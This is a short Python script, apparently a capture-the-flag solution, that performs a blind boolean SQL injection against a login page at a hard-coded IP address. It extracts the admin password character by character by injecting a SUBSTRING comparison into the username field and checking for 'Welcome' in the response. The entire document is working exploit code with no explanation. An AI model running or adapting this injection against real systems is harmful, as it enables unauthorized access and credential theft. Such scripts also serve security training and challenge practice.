import requests
import re

url ="http://143.198.200.16:50621/logins.php"

ammo = 'fl4gphpPHPabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'
flag = ''
payload = "admin' AND BINARY SUBSTRING((SELECT passw0rd FROM user WHERE Username = 'admin'), {}, 1) = '{}' -- "
loop = True
c = 1
while loop:
    for i in range(len(ammo)):
        data = {
            'username': payload.format(c,ammo[i]),
            'passw0rd': ''
        }
        r = requests.post(url=url, data=data)
        response = r.text
        print(ammo[i])
        if 'Welcome' in response:
            flag += ammo[i]
            c += 1
            print(flag)
        else:
            continue
